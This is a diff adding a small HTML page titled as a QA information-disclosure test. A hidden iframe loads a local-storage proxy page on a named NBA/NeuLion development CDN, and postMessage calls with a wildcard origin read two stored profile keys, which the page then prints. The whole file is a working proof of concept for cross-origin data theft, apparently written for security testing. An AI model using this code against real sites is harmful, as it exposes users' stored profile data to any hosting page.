@@ -1,0 +1,29 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="ISO-8859-1">
+	<title>QA Information Disclosure Test</title>
+	<script type="text/javascript">
+		window.onload = () => {
+			const output = document.getElementById("output");
+			const iFrame = document.getElementById("nlaaeuiIFrame");
+
+
+			window.onmessage = (pEvt) => {
+				output.innerHTML += "<p>" + pEvt.data.key + " = " + pEvt.data.value + "</p>";
+			};
+		}
+
+		function disclose(pIFrame) {
+			console.log("disclosing...");
+			pIFrame.contentWindow.postMessage({key: "nldtcprofile", method: "lget"}, "*");
+			pIFrame.contentWindow.postMessage({key: "nlnbaprofile", method: "lget"}, "*");
+		}
+	</script>
+</head>
+<body>
+<iframe onload="disclose(this)" id="nlaaeuiIFrame" src="https://nbaddevcdn.neulion.com/nba/site_4/local-storage-proxy.html" style="display: none"></iframe>
+<div id="output"></div>
+</body>
+</html>
